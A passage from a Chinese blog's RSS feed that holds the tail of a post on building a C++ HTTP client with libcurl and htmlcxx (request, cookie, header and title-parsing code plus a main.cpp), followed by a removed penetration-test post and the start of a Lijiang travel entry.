&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;postRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_POSTFIELDS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;cm&quot;&gt;/**
 * 设置Cookie
 * @param cookie
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 设置请求头
 * @param header
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addRequestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl_slist_append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 返回页面标题
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ParserDom&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parserDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parserDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parseTree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 返回响应头
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 通过键名获取键值
 * @param Key
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;main.cpp&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &quot;http.h&quot;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;args count :&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.baidu.com/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Set-Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x07-参考&quot;&gt;0x07 参考&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;C++ Html解析器-HtmlCxx用户手册和源代码解析 ： https://www.cnblogs.com/zhanglanyun/archive/2011/10/21/2220647.html&lt;/li&gt;
  &lt;li&gt;C++ 分割字符串两种方法：https://www.cnblogs.com/dfcao/p/cpp-FAQ-split.html&lt;/li&gt;
  &lt;li&gt;libcurl - API：https://curl.haxx.se/libcurl/c/&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x08-结语&quot;&gt;0x08 结语&lt;/h2&gt;

&lt;p&gt;后面继续扩展代理功能、并不是很难&lt;/p&gt;

&lt;p&gt;希望能够把轮子造好，为后面的项目开发做准备。&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-01-23/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-01-23/1</guid>
        
        
        <category>C++/C</category>
        
      </item>
    
      <item>
        <title>针对某跨国企业的一次渗透测试-持续</title>
        <description>&lt;p&gt;文章涉及泄漏厂商隐私，已经删除！
&lt;!--more--&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 22 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-01-30/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-01-30/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>我的丽江之旅</title>
        <description>&lt;p&gt;记录一下我眼中的丽江，不以叙事风格来写，只写我印象最深的它。
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;出发&quot;&gt;出发&lt;/h2&gt;

